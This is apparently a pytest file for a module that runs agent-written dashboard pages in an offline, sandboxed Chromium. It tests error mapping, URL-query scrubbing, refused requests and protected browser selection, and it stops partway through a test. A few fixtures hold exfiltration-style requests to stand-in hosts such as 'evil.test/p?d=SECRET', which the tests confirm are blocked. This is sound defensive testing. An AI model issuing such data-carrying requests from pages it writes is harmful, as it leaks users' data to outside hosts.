"""Tests for ``dashboard_verify`` -- the offline run of an agent-written dashboard page.

Three layers, cheapest first.

* The parts that need no browser: where a browser position lands in the agent's own
  ``view.html``, which DevTools events are errors a page author can act on, which
  browser is chosen, and every way a run is skipped.
* The whole pipeline against a FAKE browser: an executable that speaks DevTools over the
  inherited pipe and plays back a scenario. It exercises what no mock can -- the real
  spawn, descriptors 3 and 4, the NUL framing, the request filter, the timeouts, the kill
  and the cleanup -- on any Linux host, with no Chromium in the loop. It also records what
  the browser was handed, so the tests can say what the page was composed from and how the
  browser was started.
* A real Chromium, when the host has one that can start its sandbox: a page that throws
  on its data, a page that renders cleanly, and a page that tries every way out to a
  loopback listener that must never see a connection.
"""

from __future__ import annotations

import json
import os
import posixpath
import random
import socket
import sys
import tempfile
import textwrap
import threading
import time
from pathlib import Path
from typing import Any

import pytest
from fake_devtools_browser import FakeBrowser

from kiro_crew import (
    dashboard_frame,
    dashboard_synth,
    dashboard_verify,
    github_runner,
    platform_compat,
)
from kiro_crew.dashboard_verify import (
    STATUS_FAILED,
    STATUS_PASSED,
    STATUS_SKIPPED,
    STATUS_TIMED_OUT,
    _Collector,
    _compose,
)
from kiro_crew.testing.wait import wait_until

LINUX_ONLY = pytest.mark.skipif(
    not platform_compat.IS_LINUX, reason="the page check runs on Linux only"
)

PAGE_URL = dashboard_verify._PAGE_URL

#: The seed the pipeline tests give the copy, so the document a browser is handed can be
#: worked out in the test.
SEED = 1234


def _synthetic(
    read: dict[str, Any], model: dict[str, Any] | None = None, page: str = ""
) -> dict[str, Any]:
    return dashboard_synth.synthesize(read, model=model, page=page, rng=random.Random(SEED))


#: The real lookup, kept before the fixture below replaces it for every other test.
_REAL_FIND_LAUNCHER_PYTHON = dashboard_verify.find_launcher_python


@pytest.fixture(autouse=True)
def _a_launcher_python_and_memory_to_spare(_floor_monkeypatch):
    """The tests run under their own interpreter (the lookup of a protected one has its own
    tests, which call ``_REAL_FIND_LAUNCHER_PYTHON``) on a host with memory to spare, so
    what a test sees does not depend on the machine it runs on."""
    _floor_monkeypatch.setattr(dashboard_verify, "find_launcher_python", lambda: sys.executable)
    _floor_monkeypatch.setattr(platform_compat, "host_available_mib", lambda: 1 << 20)


def _read(**fields: Any) -> dict[str, Any]:
    return dashboard_frame.read_payload(fields or {"open_prs": 7}, agentic=[], seq=1)


# --------------------------------------------------------------------------- #
# 1. Where an error lands in the agent's own page
# --------------------------------------------------------------------------- #


def test_a_position_in_the_composed_document_maps_to_the_pages_own_line():
    """The browser counts lines in the document the frame composed, the agent in its HTML.

    The host markup above the page is several screens of script, so a raw line number is
    useless to the agent. The mapping is anchored on where ``compose`` actually put the
    page, not on a constant, so a change to the frame's head moves it with the frame.
    """
    page = "<p>one</p>\n<script>\n  boom();\n</script>"
    doc = _compose(page, _read())

    assert doc.page_lines == 4
    assert doc.html.splitlines()[doc.first_line] == "<p>one</p>"
    assert doc.html.splitlines()[doc.first_line + 2] == "  boom();"
    # DevTools positions are zero-based, the agent's are one-based.
    assert doc.locate(doc.first_line + 2, 2) == (3, 3)
    assert doc.locate(doc.first_line, 0) == (1, 1)


def test_a_position_outside_the_page_has_no_line():
    """An error in the frame's own scripts is not the agent's to find in its HTML."""
    doc = _compose("<p>x</p>", _read())

    assert doc.locate(doc.first_line - 1, 0) == (None, None)
    assert doc.locate(doc.first_line + 1, 0) == (None, None)
    assert doc.locate(None, None) == (None, None)


def test_a_page_whose_text_also_appears_in_the_frame_is_still_found_where_it_sits():
    """A one-word page must not be matched inside the head the frame writes."""
    doc = _compose("html", _read())

    assert doc.html.splitlines()[doc.first_line] == "html"


# --------------------------------------------------------------------------- #
# 2. Which events are errors
# --------------------------------------------------------------------------- #


def _exception(
    description: str, line: int, column: int = 0, *, text: str = "Uncaught", url=PAGE_URL
):
    frame = {
        "functionName": "",
        "scriptId": "1",
        "url": url,
        "lineNumber": line,
        "columnNumber": column,
    }
    return {
        "timestamp": 1,
        "exceptionDetails": {
            "exceptionId": 1,
            "text": text,
            "lineNumber": line,
            "columnNumber": column,
            "url": url,
            "stackTrace": {"callFrames": [frame]},
            "exception": {"type": "object", "description": description},
        },
    }


def test_an_uncaught_exception_keeps_its_first_line_and_its_throw_site():
    c = _Collector()
    c.on_event(
        "Runtime.exceptionThrown",
        _exception("TypeError: rows.map is not a function\n    at <anonymous>:12:5", 40, 7),
    )

    assert [(e.kind, e.message, e.line, e.column) for e in c.errors] == [
        ("exception", "TypeError: rows.map is not a function", 40, 7)
    ]


def test_an_unhandled_rejection_is_its_own_kind():
    c = _Collector()
    c.on_event(
        "Runtime.exceptionThrown", _exception("Error: later", 3, text="Uncaught (in promise)")
    )

    assert c.errors[0].kind == "rejection"


def test_a_thrown_primitive_still_yields_a_message():
    c = _Collector()
    params = _exception("", 1)
    params["exceptionDetails"]["exception"] = {"type": "string", "value": "boom"}
    c.on_event("Runtime.exceptionThrown", params)

    assert c.errors[0].message == "Uncaught boom"


def test_an_error_from_a_script_that_is_not_the_page_has_no_position():
    """A line number inside someone else's file would point at the wrong place."""
    c = _Collector()
    c.on_event("Runtime.exceptionThrown", _exception("Error: x", 9, url="https://cdn.example/x.js"))

    assert (c.errors[0].line, c.errors[0].column) == (None, None)


def test_console_error_and_failed_assert_are_page_errors_and_console_log_is_not():
    c = _Collector()
    frame = {
        "url": PAGE_URL,
        "lineNumber": 5,
        "columnNumber": 2,
        "functionName": "",
        "scriptId": "1",
    }

    def call(kind: str, *values: Any) -> None:
        c.on_event(
            "Runtime.consoleAPICalled",
            {
                "type": kind,
                "args": [
                    (
                        {"type": "string", "value": v}
                        if isinstance(v, str)
                        else {"type": "number", "value": v}
                    )
                    for v in values
                ],
                "stackTrace": {"callFrames": [frame]},
            },
        )

    call("log", "fine")
    call("warning", "also fine")
    call("error", "totals missing", 3)
    call("assert", "x was empty")

    assert [(e.kind, e.message, e.line) for e in c.errors] == [
        ("console", "console.error: totals missing 3", 5),
        ("console", "console.assert failed: x was empty", 5),
    ]


def test_only_a_security_log_entry_is_an_error_and_a_blocked_request_is_not():
    """A script exception is also logged; a refused request is this run's own doing."""
    c = _Collector()
    for source, text in (
        ("javascript", "Uncaught TypeError: x"),
        ("network", "Failed to load resource: net::ERR_BLOCKED_BY_CLIENT"),
        (
            "security",
            "Connecting to 'https://x.test/?d=secret' violates the following Content "
            "Security Policy directive: \"connect-src 'none'\".",
        ),
    ):
        c.on_event("Log.entryAdded", {"entry": {"source": source, "level": "error", "text": text}})
    c.on_event("Log.entryAdded", {"entry": {"source": "security", "level": "warning", "text": "w"}})

    assert [e.kind for e in c.errors] == ["csp"]
    assert "secret" not in c.errors[0].message, "a URL's query was echoed back to the agent"
    assert "connect-src 'none'" in c.errors[0].message


def test_the_same_error_is_kept_once_and_the_rest_are_counted():
    c = _Collector()
    for _ in range(3):
        c.on_event("Runtime.exceptionThrown", _exception("Error: same", 1))
    for n in range(dashboard_verify.MAX_ERRORS + 4):
        c.on_event("Runtime.exceptionThrown", _exception(f"Error: distinct {n}", 2))

    assert len(c.errors) == dashboard_verify.MAX_ERRORS
    assert c.omitted == 5, "one duplicate collapsed, eleven distinct, eight kept"


def test_a_page_that_throws_without_end_is_counted_and_not_stored():
    """Past the cap an error adds a count and no key: the collector stops growing."""
    c = _Collector()
    for n in range(dashboard_verify.MAX_ERRORS * 50):
        c.on_event("Runtime.exceptionThrown", _exception(f"Error: {n}", n))

    assert len(c.errors) == dashboard_verify.MAX_ERRORS
    assert len(c._seen) == dashboard_verify._MAX_SEEN, "the dedupe set grew past its bound"
    assert c.omitted == dashboard_verify.MAX_ERRORS * 49


def test_an_error_past_the_cap_that_repeats_is_counted_once():
    """A timer that throws the same ninth error again and again is one error, not a hundred."""
    c = _Collector()
    for n in range(dashboard_verify.MAX_ERRORS):
        c.on_event("Runtime.exceptionThrown", _exception(f"Error: first {n}", n))
    for _ in range(100):
        c.on_event("Runtime.exceptionThrown", _exception("Error: ninth", 99))

    assert len(c.errors) == dashboard_verify.MAX_ERRORS
    assert c.omitted == 1


def test_a_refused_url_is_clipped_where_it_is_stored(monkeypatch):
    """The page picks the URL, so neither how many nor how long is the page's to choose."""
    from kiro_crew.dashboard_verify import _MAX_BLOCKED_URLS, _MAX_URL_CHARS, _Run

    sent: list[tuple[str, dict[str, Any]]] = []

    class _Sink:
        on_event = None

        def send(self, method: str, params: dict[str, Any], _session: str, _deadline: float):
            sent.append((method, params))

    run = _Run(_Sink(), _compose("<p>x</p>", _read()), 0.0)
    for n in range(_MAX_BLOCKED_URLS * 3):
        url = f"https://x.test/{n}/" + "a" * (_MAX_URL_CHARS * 10)
        run._answer({"requestId": str(n), "request": {"url": url}})

    assert len(run.collector.blocked) == _MAX_BLOCKED_URLS
    assert all(len(u) == _MAX_URL_CHARS for u in run.collector.blocked)
    # What does not fit is counted, and the note says there is more than it lists.
    assert run.collector.blocked_overflow == _MAX_BLOCKED_URLS * 2
    run.collector.loaded = True
    (note,) = _verdict(run.collector).notes
    assert f"and {_MAX_BLOCKED_URLS - 3 + _MAX_BLOCKED_URLS * 2} more." in note
    assert {m for m, _ in sent} == {"Fetch.failRequest"}, "every one of them is still refused"
    assert len(sent) == _MAX_BLOCKED_URLS * 3


def test_a_url_in_an_error_loses_its_query_and_its_fragment():
    """A page that builds a URL out of its data does not get the data echoed back."""
    c = _Collector()
    c.on_event(
        "Runtime.exceptionThrown",
        _exception("Error: failed https://api.example.test/x?d=SECRET&n=1#frag", 1),
    )
    c.on_event(
        "Runtime.consoleAPICalled",
        {"type": "error", "args": [{"value": "bad https://api.example.test/y?d=SECRET2"}]},
    )

    assert [e.message for e in c.errors] == [
        "Error: failed https://api.example.test/x",
        "console.error: bad https://api.example.test/y",
    ]


def test_a_message_of_many_urls_is_scrubbed_over_a_bounded_stretch(monkeypatch):
    """The page chooses its message and its length; the scrub for URL queries is quadratic in
    what it is handed, so it is handed a bounded stretch and not the whole message."""
    handed: list[int] = []
    original = dashboard_verify._without_queries
    monkeypatch.setattr(
        dashboard_verify,
        "_without_queries",
        lambda text: handed.append(len(text)) or original(text),
    )

    shown = dashboard_verify._message("http://" * 500_000)

    assert handed == [dashboard_verify._SCRUB_CHARS]
    assert len(shown) <= dashboard_verify.MAX_MESSAGE_CHARS


def test_a_url_query_past_the_scrubbed_stretch_is_not_shown_either():
    text = "x" * 3000 + " http://a.example/p?token=abc123"

    assert "token" not in dashboard_verify._message(text)


def test_a_long_message_is_clipped():
    c = _Collector()
    c.on_event("Runtime.exceptionThrown", _exception("Error: " + "x" * 5000, 1))

    assert len(c.errors[0].message) == dashboard_verify.MAX_MESSAGE_CHARS


def _committed(url: str = PAGE_URL, **frame: Any) -> dict[str, Any]:
    return {"frame": {"id": "F", "loaderId": "L", "url": url, **frame}, "type": "Navigation"}


def test_load_and_crash_events_set_their_flags():
    c = _Collector()
    c.on_event("Page.frameNavigated", _committed())
    c.on_event("Page.loadEventFired", {"timestamp": 1})
    c.on_event("Inspector.targetCrashed", {})

    assert c.loaded and c.crashed


def test_only_the_load_of_the_page_document_counts():
    """The blank page the tab starts on, and a frame inside the page, load first or later."""
    c = _Collector()
    c.on_event("Page.frameNavigated", _committed("about:blank"))
    c.on_event("Page.loadEventFired", {"timestamp": 1})
    assert not c.loaded

    c.on_event("Page.frameNavigated", _committed(parentId="F0"))
    c.on_event("Page.loadEventFired", {"timestamp": 2})
    assert not c.loaded

    c.on_event("Page.frameNavigated", _committed())
    c.on_event("Page.loadEventFired", {"timestamp": 3})
    assert c.loaded


# --------------------------------------------------------------------------- #
# 2b. The pipe
# --------------------------------------------------------------------------- #


@LINUX_ONLY
def test_an_oversize_message_is_dropped_whole_and_the_stream_stays_in_step(monkeypatch):
    """The browser can be made to send a message of any size; none of it is kept."""
    monkeypatch.setattr(dashboard_verify, "_MAX_MESSAGE_BYTES", 100)
    read_end, write_end = os.pipe()
    pipe = dashboard_verify._Pipe(os.dup(write_end), read_end)
    small = json.dumps({"method": "Page.loadEventFired", "params": {}}).encode() + b"\0"
    try:
        os.write(write_end, small)
        assert (pipe.receive(time.monotonic() + 5) or {})["method"] == "Page.loadEventFired"
        # The start of a message with no end in sight: nothing of it is kept.
        os.write(write_end, b"x" * 600)
        assert pipe.receive(time.monotonic() + 0.2) is None
        assert pipe._buffer == b"" and pipe._discarding
        # Its tail is dropped with it, and the next message arrives intact.
        os.write(write_end, b"y" * 600 + b"\0" + small)
        assert (pipe.receive(time.monotonic() + 5) or {})["method"] == "Page.loadEventFired"
        assert not pipe._discarding
        assert pipe.dropped == 1
    finally:
        pipe.close()
        for fd in (read_end, write_end, pipe._out):
            os.close(fd)


# --------------------------------------------------------------------------- #
# 3. The verdict
# --------------------------------------------------------------------------- #


def _verdict(collector: _Collector, page: str = "x") -> dashboard_verify.Verification:
    return dashboard_verify._verdict(collector, _compose(page, _read()), 0.0)


def test_a_loaded_page_with_no_errors_passes():
    c = _Collector()
    c.loaded = True

    v = _verdict(c)

    assert v.status == STATUS_PASSED and v.errors == ()


def test_a_page_that_never_loads_is_timed_out_and_a_crash_is_a_crash():
    slow = _verdict(_Collector())
    hung = _Collector()
    hung.committed = True
    crashed = _Collector()
    crashed.crashed = True

    # The browser never got as far as the page: the machine was slow, the page is not blamed.
    assert slow.status == STATUS_TIMED_OUT and slow.errors == ()
    assert "second limit" in slow.reason
    # It did, and the page never finished: a script that never returns is the likely cause.
    assert hung.committed
    timed_out = _verdict(hung)
    assert timed_out.status == STATUS_TIMED_OUT
    assert [e.kind for e in timed_out.errors] == ["timeout"]
    assert _verdict(crashed).status == STATUS_FAILED
    assert _verdict(crashed).errors[-1].kind == "crash"


def test_a_page_that_ran_says_it_ran_over_a_synthetic_copy():
    c = _Collector()
    c.loaded = True

    v = _verdict(c)

    assert v.data == dashboard_verify.DATA_SYNTHETIC == "synthetic"
    assert v.wire()["data"] == "synthetic"
    skipped = dashboard_verify.Verification(STATUS_SKIPPED, reason="no browser")
    assert skipped.wire()["data"] == ""


def test_a_failure_says_that_the_values_are_invented():
    v = _verdict(_after_a_refused_library("TypeError: rows.map is not a function"))

    assert v.status == STATUS_FAILED
    assert any("invented" in note and "missing field" in note for note in v.notes)


def test_the_error_positions_are_the_pages_own():
    doc = _compose("<p>a</p>\n<script>\n  oops();\n</script>", _read())
    c = _Collector()
    c.loaded = True
    c.on_event(
        "Runtime.exceptionThrown",
        _exception("ReferenceError: oops is not defined", doc.first_line + 2, 2),
    )

    v = dashboard_verify._verdict(c, doc, 0.0)

    assert [(e.line, e.column) for e in v.errors] == [(3, 3)]
    assert v.wire()["errors"][0] == {
        "kind": "exception",
        "message": "ReferenceError: oops is not defined",
        "line": 3,
        "column": 3,
    }


def test_a_refused_library_is_listed_and_a_refused_query_is_not_echoed():
    c = _Collector()
    c.loaded = True
    c.refuse("https://cdn.jsdelivr.net/npm/chart.js@4", "Script")
    c.refuse("https://evil.test/p?d=SECRET", "Fetch")

    note = _verdict(c).notes[0]

    assert "chart.js@4" in note and "depends on it did not run" in note
    assert "SECRET" not in note


def test_a_refused_request_to_another_host_is_listed_without_the_library_remark():
    c = _Collector()
    c.loaded = True
    c.refuse("https://example.com/?d=1", "Script")

    assert _verdict(c).notes == (
        "This check runs offline, so these requests were refused: https://example.com/.",
    )


# --------------------------------------------------------------------------- #
# 3b. A library the run could not fetch
# --------------------------------------------------------------------------- #


_CHART_JS = "https://cdn.jsdelivr.net/npm/chart.js@4"


def _after_a_refused_library(
    *descriptions: str, urls: tuple[str, ...] = (_CHART_JS,)
) -> _Collector:
    """A run whose page asked for *urls* (Chart.js by default), was refused, and then raised
    *descriptions*."""
    c = _Collector()
    c.loaded = True
    for url in urls:
        c.refuse(url, "Script")
    for line, description in enumerate(descriptions, start=1):
        c.on_event("Runtime.exceptionThrown", _exception(description, line))
    return c


def test_a_script_that_stops_at_a_library_this_run_could_not_fetch_is_skipped_not_failed():
    v = _verdict(_after_a_refused_library("ReferenceError: Chart is not defined"))

    assert v.status == STATUS_SKIPPED and v.errors == ()
    assert "'Chart is not defined'" in v.reason
    assert "CDN origin" in v.reason and "offline" in v.reason
    assert "chart.js@4" in v.notes[0]


def test_the_pages_own_error_is_reported_beside_a_library_that_was_not_fetched():
    """A page that draws with Chart.js still has its data bug found."""
    v = _verdict(
        _after_a_refused_library(
            "ReferenceError: Chart is not defined", "TypeError: rows.map is not a function"
        )
    )

    assert v.status == STATUS_FAILED
    assert [e.message for e in v.errors] == ["TypeError: rows.map is not a function"]
    assert any("'Chart is not defined'" in note for note in v.notes)


@pytest.mark.parametrize(
    "refused",
    [
        None,
        ("https://example.com/chart.js", "Script"),
        ("https://cdn.jsdelivr.net/npm/logo.png", "Image"),
        ("https://cdn.jsdelivr.net.example.test/chart.js", "Script"),
        ("https://example.test/?u=https://cdn.jsdelivr.net/chart.js", "Script"),
    ],
)
def test_an_undefined_name_is_the_pages_own_unless_a_library_script_was_refused(refused):
    c = _Collector()
    c.loaded = True
    if refused:
        c.refuse(*refused)
    c.on_event("Runtime.exceptionThrown", _exception("ReferenceError: totl is not defined", 3))

    v = _verdict(c)

    assert v.status == STATUS_FAILED
    assert [e.message for e in v.errors] == ["ReferenceError: totl is not defined"]


def test_a_typo_on_a_page_that_loads_a_library_is_still_the_pages_own_error():
    """The URL has to suggest the name: an undefined name is not excused by any library."""
    v = _verdict(_after_a_refused_library("ReferenceError: totl is not defined"))

    assert v.status == STATUS_FAILED
    assert [e.message for e in v.errors] == ["ReferenceError: totl is not defined"]


@pytest.mark.parametrize(
    ("name", "url", "defines"),
    [
        ("Chart", "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js", True),
        ("d3", "https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js", True),
        ("Plotly", "https://cdn.jsdelivr.net/npm/plotly.js-dist-min@2", True),
        ("THREE", "https://cdn.jsdelivr.net/npm/three@0.160/build/three.module.js", True),
        (
            "ReactDOM",
            "https://cdn.jsdelivr.net/npm/react-dom@18/umd/react-dom.production.min.js",
            True,
        ),
        ("Alpine", "https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js", True),
        ("$", "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js", True),
        ("_", "https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js", True),
        ("L", "https://cdn.jsdelivr.net/npm/leaflet@1.9/dist/leaflet.js", True),
        ("totl", "https://cdn.jsdelivr.net/npm/chart.js@4", False),
        ("Chat", "https://cdn.jsdelivr.net/npm/chart.js@4", False),
        # Words every URL on the two CDNs carries name no library.
        ("ajax", "https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js", False),
        ("npm", "https://cdn.jsdelivr.net/npm/chart.js@4", False),
        ("L", "https://cdn.jsdelivr.net/npm/chart.js@4", False),
    ],
)
def test_a_library_url_suggests_the_names_it_defines(name, url, defines):
    assert dashboard_verify._defined_by(name, url) is defines


def test_a_missing_library_that_the_page_caught_and_logged_is_recognised_too():
    c = _after_a_refused_library()
    c.on_event(
        "Runtime.consoleAPICalled",
        {
            "type": "error",
            "args": [
                {"type": "object", "description": "ReferenceError: Chart is not defined\n  at x"}
            ],
        },
    )

    v = _verdict(c)

    assert v.status == STATUS_SKIPPED and "'Chart is not defined'" in v.reason


def test_the_names_a_library_left_undefined_are_listed_three_at_most():
    libraries = {
        "Chart": _CHART_JS,
        "d3": "https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js",
        "Plotly": "https://cdn.jsdelivr.net/npm/plotly.js-dist-min@2",
        "echarts": "https://cdn.jsdelivr.net/npm/echarts@5",
        "THREE": "https://cdn.jsdelivr.net/npm/three@0.160/build/three.module.js",
    }

    v = _verdict(
        _after_a_refused_library(
            *(f"ReferenceError: {name} is not defined" for name in libraries),
            urls=tuple(libraries.values()),
        )
    )

    assert v.status == STATUS_SKIPPED
    assert "'Chart is not defined', 'd3 is not defined', 'Plotly is not defined' and 2 more" in (
        v.reason
    )


def test_a_library_page_that_never_loads_is_timed_out():
    c = _after_a_refused_library("ReferenceError: Chart is not defined")
    c.loaded = False
    c.committed = True

    v = _verdict(c)

    assert v.status == STATUS_TIMED_OUT
    assert [e.kind for e in v.errors] == ["timeout"]


def test_too_many_distinct_errors_leave_none_to_blame_on_the_library():
    many = [f"ReferenceError: n{n} is not defined" for n in range(dashboard_verify.MAX_ERRORS + 1)]

    v = _verdict(_after_a_refused_library(*many))

    assert v.status == STATUS_FAILED and v.omitted == 1
    assert len(v.errors) == dashboard_verify.MAX_ERRORS


def test_a_library_refused_past_the_url_cap_is_still_known():
    c = _Collector()
    for n in range(dashboard_verify._MAX_BLOCKED_URLS):
        c.refuse(f"https://example.test/{n}", "Image")
    assert not c.library_refused

    c.refuse("https://cdn.jsdelivr.net/npm/chart.js@4", "Script")

    assert c.library_refused and c.blocked_overflow == 1


def test_the_wire_form_is_plain_json():
    v = dashboard_verify.Verification(STATUS_SKIPPED, reason="no browser", elapsed_ms=3)

    assert json.loads(json.dumps(v.wire())) == {
        "status": "skipped",
        "data": "",
        "errors": [],
        "reason": "no browser",
        "notes": [],
    }


# --------------------------------------------------------------------------- #
# 3b. What the dashboard's secret filter did to the page
# --------------------------------------------------------------------------- #

#: What the filter writes in place of what it takes out.
MARK = "[REDACTED: credential]"


def test_a_page_the_filter_left_alone_has_nothing_to_say():
    page = "<p>x</p>\n<script>var a = 1;</script>"

    assert dashboard_verify.rewrite_note(page, page) == ""


def test_one_rewritten_place_is_counted_and_its_line_is_the_pages_own():
    before = '<p>x</p>\n<script>\n  var k = "SECRET-VALUE";\n  use(k);\n</script>'
    after = before.replace("SECRET-VALUE", MARK)

    note = dashboard_verify.rewrite_note(before, after)

    assert "rewrote 1 place in it, on line 3" in note
    assert "SECRET-VALUE" not in note and "REDACTED" not in note, "the note quotes the page"
    assert "works on the rewritten page" in note
    assert "line numbers" not in note.lower() and "Error positions" not in note


def test_several_rewritten_places_are_counted_and_the_first_is_named():
    before = "\n".join(
        ["<p>a</p>", "<script>", 'var a = "ONE";', "var b = 2;", 'var c = "TWO";', "</script>"]
        + ['var d = "THREE";']
    )
    after = before.replace("ONE", MARK).replace("TWO", MARK).replace("THREE", MARK)

    note = dashboard_verify.rewrite_note(before, after)

    assert "rewrote 3 places in it, the first on line 3" in note
    assert not any(word in note for word in ("ONE", "TWO", "THREE"))


def test_a_mark_the_page_already_held_is_not_a_place_the_filter_rewrote():
    before = f'<p>{MARK}</p>\n<script>var k = "SECRET";</script>'
    after = before.replace("SECRET", MARK)

    note = dashboard_verify.rewrite_note(before, after)

    assert "rewrote 1 place in it, on line 2" in note


def test_a_change_that_leaves_no_mark_still_counts_as_one_place():
    """A filter of another make: the text changed, and the note still says where."""
    note = dashboard_verify.rewrite_note("line one\nline SECRET two", "line one\nline two")

    assert "rewrote 1 place in it, on line 2" in note


def test_a_rewrite_that_changes_the_number_of_lines_says_how_positions_are_counted():
    before = "a\n-----BEGIN KEY-----\nx\ny\n-----END KEY-----\nb"
    after = f"a\n{MARK}\nb"

    note = dashboard_verify.rewrite_note(before, after)

    assert "rewrote 1 place in it, on line 2" in note
    assert "Error positions count the lines of the rewritten page." in note


def test_the_first_line_is_found_in_a_page_longer_than_one_compare_chunk():
    filler = "<div>0123456789</div>\n" * 2000
    assert len(filler) > 10 * dashboard_verify._COMPARE_CHUNK
    before = filler + 'var k = "SECRET";\n' + filler

    note = dashboard_verify.rewrite_note(before, before.replace("SECRET", MARK))

    assert "on line 2001" in note


@pytest.mark.parametrize(
    ("before", "after", "expected"),
    [
        ("abc", "abd", 2),
        ("abc", "abc", 3),
        ("abc", "abcd", 3),
        ("abcd", "abc", 3),
        ("", "x", 0),
        ("x" * 4095 + "a", "x" * 4095 + "b", 4095),
        ("x" * 4096 + "a", "x" * 4096 + "b", 4096),
        ("x" * 4097 + "a", "x" * 4097 + "b", 4097),
        ("x" * 9000 + "a" + "y" * 5000, "x" * 9000 + "b" + "y" * 5000, 9000),
    ],
)
def test_the_first_difference_is_where_the_texts_part(before, after, expected):
    assert dashboard_verify._first_difference(before, after) == expected


# --------------------------------------------------------------------------- #
# 4. Which browser
# --------------------------------------------------------------------------- #


def _executable(path: Path) -> Path:
    path.write_text("#!/bin/sh\n")
    path.chmod(0o755)
    return path


@pytest.fixture
def provenance(monkeypatch) -> list[dict[str, Any]]:
    """Accept every path, and record how the provenance check was asked."""
    asked: list[dict[str, Any]] = []

    def check(path: str, **kw: Any) -> str:
        asked.append({"path": path, **kw})
        return path

    monkeypatch.setattr(github_runner, "validate_provider_executable", check)
    return asked


def test_the_first_installed_browser_wins_and_is_checked_as_protected(
    tmp_path, monkeypatch, provenance
):
    first, second = _executable(tmp_path / "first"), _executable(tmp_path / "second")
    monkeypatch.setattr(
        dashboard_verify, "_SYSTEM_BROWSERS", (str(tmp_path / "absent"), str(first), str(second))
    )

    assert dashboard_verify.find_browser() == str(first)
    # The property that keeps an agent from choosing the program the gateway runs.
    assert provenance == [{"path": str(first), "require_protected": True}]


def test_a_candidate_the_provenance_check_refuses_is_skipped(tmp_path, monkeypatch):
    refused, allowed = _executable(tmp_path / "refused"), _executable(tmp_path / "allowed")
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_BROWSERS", (str(refused), str(allowed)))

    def check(path: str, **_k: Any) -> str:
        if path == str(refused):
            raise ValueError("owned by another user")
        return path

    monkeypatch.setattr(github_runner, "validate_provider_executable", check)

    assert dashboard_verify.find_browser() == str(allowed)


def test_a_build_this_account_can_write_is_never_run(tmp_path, monkeypatch):
    """The real check, no stub: a file the agent could have put there is refused.

    A file made by the test is owned by the account running it, which is exactly the
    ownership of anything the agent writes into its home. Strict provenance wants it
    root-owned and out of this account's reach, so it must be turned away.
    """
    planted = _executable(tmp_path / "chrome")
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_BROWSERS", (str(planted),))

    assert dashboard_verify.find_browser() is None


def test_a_playwright_cache_is_not_searched(tmp_path, monkeypatch, provenance):
    """A build in the user's cache is writable by the agent, so it is not a candidate."""
    cache = tmp_path / "ms-playwright"
    _executable_in = cache / "chromium_headless_shell-1100" / "chrome-headless-shell-linux64"
    _executable_in.mkdir(parents=True)
    _executable(_executable_in / "chrome-headless-shell")
    (cache / "chromium_headless_shell-1100" / "INSTALLATION_COMPLETE").write_text("")
    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(cache))
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_BROWSERS", ())

    assert dashboard_verify.find_browser() is None
    assert provenance == []


def test_the_listed_browsers_are_real_files_and_not_links_or_wrapper_paths():
    """Strict provenance refuses a link, so a link in the list could never be chosen."""
    for path in dashboard_verify._SYSTEM_BROWSERS:
        assert posixpath.isabs(path)
        assert not path.startswith(("/usr/bin/", "/usr/local/bin/", "/snap/")), path
        # macOS keeps apps in a directory every administrator account can write, which
        # the provenance check refuses, so a path there could never be chosen.
        assert not path.startswith("/Applications/"), path


@LINUX_ONLY
def test_the_launcher_python_is_a_resolved_file_checked_as_protected(
    tmp_path, monkeypatch, provenance
):
    real = _executable(tmp_path / "python3.12")
    link = tmp_path / "python3"
    link.symlink_to(real)
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_PYTHONS", (str(link),))

    assert _REAL_FIND_LAUNCHER_PYTHON() == str(real)
    # The link is resolved first: strict provenance refuses a link, and it is the file
    # that gets run.
    assert provenance == [{"path": str(real), "require_protected": True}]


def test_a_python_this_account_can_write_is_never_the_launcher(tmp_path, monkeypatch):
    """The real check, no stub: the interpreter that starts the browser is held to the
    same bar as the browser, so an agent cannot swap it for a program of its own."""
    planted = _executable(tmp_path / "python3")
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_PYTHONS", (str(planted),))

    assert _REAL_FIND_LAUNCHER_PYTHON() is None


def test_the_launcher_python_candidates_are_the_fixed_system_paths():
    assert dashboard_verify._SYSTEM_PYTHONS == ("/usr/bin/python3",)


def test_the_gateways_own_interpreter_is_never_the_launcher(tmp_path, monkeypatch, provenance):
    """The stub accepts any path, so only the candidate list can keep this one out."""
    own = _executable(tmp_path / "venv-python")
    monkeypatch.setattr(sys, "executable", str(own))
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_PYTHONS", ())

    assert _REAL_FIND_LAUNCHER_PYTHON() is None
    assert provenance == []


def test_the_browser_is_started_by_the_interpreter_it_was_given(monkeypatch):
    seen: list[list[str]] = []

    class _Popen:
        pid = 0

        def __init__(self, argv: list[str], **_kw: Any) -> None:
            seen.append(argv)
            raise OSError("stop here")

    monkeypatch.setattr(dashboard_verify.subprocess, "Popen", _Popen)
    with tempfile.TemporaryDirectory() as profile, pytest.raises(OSError):
        dashboard_verify._spawn("/opt/system-python", "/opt/chrome", profile, 7, 8)

    assert seen[0][0] == "/opt/system-python"
    assert "/opt/chrome" in seen[0] and sys.executable not in seen[0]


def test_no_browser_is_none(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "_SYSTEM_BROWSERS", ())

    assert dashboard_verify.find_browser() is None


# --------------------------------------------------------------------------- #
# 5. Every way a run is skipped
# --------------------------------------------------------------------------- #


@LINUX_ONLY
def test_no_browser_skips_with_a_reason_the_agent_can_read(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: None)

    v = dashboard_verify.verify_page("<p>x</p>", _read())

    assert v.status == STATUS_SKIPPED
    assert "no system-installed Chromium or Chrome" in v.reason


@LINUX_ONLY
def test_no_launcher_python_skips_with_a_reason(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/opt/chrome")
    monkeypatch.setattr(dashboard_verify, "find_launcher_python", lambda: None)

    v = dashboard_verify.verify_page("<p>x</p>", _read())

